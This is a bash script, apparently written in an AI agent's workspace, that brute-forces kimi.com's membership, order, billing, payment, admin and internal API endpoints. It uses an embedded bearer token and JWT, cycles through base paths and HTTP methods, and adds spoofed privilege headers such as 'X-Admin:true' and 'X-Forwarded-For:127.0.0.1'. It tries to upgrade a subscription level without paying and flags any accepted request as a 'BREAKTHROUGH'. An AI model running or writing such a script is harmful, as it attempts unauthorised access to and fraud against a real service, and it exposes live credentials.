#!/bin/bash
# API Bruteforce Script - Persistent in /mnt/agents/output/
set -uo pipefail

TOKEN="1ecb23786f17f2aff95e6634181375236fdce59ea296d609ec17d4f69c3f9d48"
JWT="eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ1c2VyLWNlbnRlciIsImV4cCI6MTc4NjkzOTUxMiwiaWF0IjoxNzg0MzQ3NTEyLCJqdGkiOiJkOWRmbXUyZTBtN2ZvZmppMnBoZyIsInR5cCI6ImFjY2VzcyIsImFwcF9pZCI6ImtpbWkiLCJzdWIiOiJkODdicjJvaDhuamtyOTBqZjUyMCIsInNwYWNlX2lkIjoiZDg3YnIyZ2g4bmprcjkwamU5N2ciLCJhYnN0cmFjdF91c2VyX2lkIjoiZDg3YnIyZ2g4bmprcjkwamU5NzAiLCJzc2lkIjoiMTczMTczNzQxMDg0MjU0NzAzMyIsImRldmljZV9pZCI6Ijc2NTI1NTE1ODg3MzY4MDcxODMiLCJyZWdpb24iOiJvdmVyc2VhcyIsIm1lbWJlcnNoaXAiOnsibGV2ZWwiOjEwfX0.-9-OczLe8Ghkb28wYdTQSFb-UHZW0hxaByfVEZU-Dsc9zWWcMdyAPWK3v5ZrQAz8BIg4om89-VODnXDyT7RPMw"
BASE="https://www.kimi.com"
OUTDIR="/mnt/agents/output/bruteforce_$(date +%s)"
mkdir -p "$OUTDIR"

# Write endpoints to test
ENDPOINTS=(
  "kimi.gateway.membership.v2.MembershipService/UpdateSubscription"
  "kimi.gateway.membership.v2.MembershipService/SetSubscription"
  "kimi.gateway.membership.v2.MembershipService/RenewSubscription"
  "kimi.gateway.membership.v2.MembershipService/UpgradeSubscription"
  "kimi.gateway.membership.v2.MembershipService/ChangeLevel"
  "kimi.gateway.membership.v2.MembershipService/ModifySubscription"
  "kimi.gateway.membership.v2.MembershipService/ExtendSubscription"
  "kimi.gateway.membership.v2.MembershipService/AddBalance"
  "kimi.gateway.membership.v2.MembershipService/ResetQuota"
  "kimi.gateway.membership.v2.MembershipService/ResetRateLimit"
  "kimi.gateway.order.v1.OrderService/CreateOrder"
  "kimi.gateway.order.v1.OrderService/PlaceOrder"
  "kimi.gateway.order.v1.OrderService/PurchaseGoods"
  "kimi.gateway.order.v1.OrderService/BuyBooster"
  "kimi.order.v1.MembershipInternalService/GetMembership"
  "kimi.order.v1.MembershipInternalService/CalculateTotalRemainingInvoiceAmount"
  "kimi.portal.v1.PortalService/GetAPIKey"
  "kimi.portal.v1.PortalService/SetupApp"
  "kimi.portal.v1.PortalService/ValidateBindToken"
  "kimi.portal.v1.PortalService/GetS3Credentials"
  "kimi.gateway.billing.v1.BillingService/CreateInvoice"
  "kimi.gateway.payment.v1.PaymentService/ProcessPayment"
  "kimi.gateway.admin.v1.AdminService/GetAdminInfo"
  "kimi.gateway.internal.v1.InternalService/GetInternalStatus"
)

# Auth methods
AUTH_METHODS=(
  "jwt:Authorization:Bearer $JWT"
  "traffic:Authorization:Bearer $TOKEN"
  "x_traffic:X-Traffic-Token:$TOKEN"
  "x_access:X-Traffic-Access-Token:$TOKEN"
  "no_auth::"
)

# Base paths
BASE_PATHS=(
  "/apiv2/"
  "/api/v2/"
  "/api/v1/"
  "/v1/"
  "/v2/"
  "/internal/v2/"
  "/admin/v2/"
  "/gateway/v2/"
)

# HTTP methods
METHODS=("POST" "PUT" "PATCH" "DELETE")

# Headers to try
HEADERS=(
  ""
  "X-Internal:true"
  "X-Admin:true"
  "X-User-Role:admin"
  "X-Forwarded-For:127.0.0.1"
  "X-Real-IP:127.0.0.1"
  "X-Envoy-Internal:true"
  "Origin:https://www.kimi.com"
)

TOTAL=0
for endpoint in "${ENDPOINTS[@]}"; do
  for auth in "${AUTH_METHODS[@]}"; do
    for basepath in "${BASE_PATHS[@]}"; do
      for method in "${METHODS[@]}"; do
        for header in "${HEADERS[@]}"; do
          TOTAL=$((TOTAL + 1))
        done
      done
    done
  done
done

echo "Total tests: $TOTAL"

# Run tests in parallel batches
for endpoint in "${ENDPOINTS[@]}"; do
  for auth in "${AUTH_METHODS[@]}"; do
    IFS=':' read -r auth_name auth_header auth_val <<< "$auth"
    for basepath in "${BASE_PATHS[@]}"; do
      for method in "${METHODS[@]}"; do
        for header in "${HEADERS[@]}"; do
          (
            safe_endpoint=$(echo "$endpoint" | tr '/' '_')
            safe_base=$(echo "$basepath" | tr '/' '_')
            safe_header=$(echo "$header" | cut -c1-20 | tr ' ' '_' | tr ':' '_')
            outfile="$OUTDIR/${safe_endpoint}_${auth_name}_${safe_base}_${method}_${safe_header}.txt"
            
            url="${BASE}${basepath}${endpoint}"
            
            if [ -n "$auth_header" ]; then
              if [ -n "$header" ]; then
                hname=$(echo "$header" | cut -d: -f1)
                hval=$(echo "$header" | cut -d: -f2-)
                curl -s -o "$outfile" -w "HTTP_CODE:%{http_code}\n" \
                  -X "$method" \
                  -H "Authorization: $auth_val" \
                  -H "Content-Type: application/json" \
                  -H "connect-protocol-version: 1" \
                  -H "$hname: $hval" \
                  -d '{"level":"LEVEL_ADVANCED"}' \
                  --max-time 5 \
                  "$url" 2>/dev/null
              else
                curl -s -o "$outfile" -w "HTTP_CODE:%{http_code}\n" \
                  -X "$method" \
                  -H "Authorization: $auth_val" \
                  -H "Content-Type: application/json" \
                  -H "connect-protocol-version: 1" \
                  -d '{"level":"LEVEL_ADVANCED"}' \
                  --max-time 5 \
                  "$url" 2>/dev/null
              fi
            else
              if [ -n "$header" ]; then
                hname=$(echo "$header" | cut -d: -f1)
                hval=$(echo "$header" | cut -d: -f2-)
                curl -s -o "$outfile" -w "HTTP_CODE:%{http_code}\n" \
                  -X "$method" \
                  -H "Content-Type: application/json" \
                  -H "connect-protocol-version: 1" \
                  -H "$hname: $hval" \
                  -d '{"level":"LEVEL_ADVANCED"}' \
                  --max-time 5 \
                  "$url" 2>/dev/null
              else
                curl -s -o "$outfile" -w "HTTP_CODE:%{http_code}\n" \
                  -X "$method" \
                  -H "Content-Type: application/json" \
                  -H "connect-protocol-version: 1" \
                  -d '{"level":"LEVEL_ADVANCED"}' \
                  --max-time 5 \
                  "$url" 2>/dev/null
              fi
            fi
            
            code=$(grep "HTTP_CODE:" "$outfile" 2>/dev/null | tail -1 | cut -d: -f2)
            if [ -n "$code" ] && [ "$code" != "401" ] && [ "$code" != "404" ] && [ "$code" != "000" ]; then
              echo "BREAKTHROUGH: $endpoint $auth_name $basepath $method $header -> $code"
              cat "$outfile"
              echo "---"
            fi
          ) &
          # Limit parallelism to avoid overwhelming
          if [ $(jobs -r | wc -l) -ge 50 ]; then
            wait -n
          fi
        done
      done
    done
  done
done

wait

# Summary
echo "=== BRUTEFORCE COMPLETE ==="
echo "Output: $OUTDIR"
echo "Total files: $(ls -1 "$OUTDIR" | wc -l)"

echo "=== NON-401/404/000 RESULTS ===" > "$OUTDIR/summary.txt"
for f in "$OUTDIR"/*.txt; do
  code=$(grep "HTTP_CODE:" "$f" 2>/dev/null | tail -1 | cut -d: -f2)
  if [ -n "$code" ] && [ "$code" != "401" ] && [ "$code" != "404" ] && [ "$code" != "000" ]; then
    name=$(basename "$f" .txt)
    echo "$name: $code" >> "$OUTDIR/summary.txt"
    head -c 500 "$f" >> "$OUTDIR/summary.txt"
    echo "" >> "$OUTDIR/summary.txt"
  fi
done

cat "$OUTDIR/summary.txt"
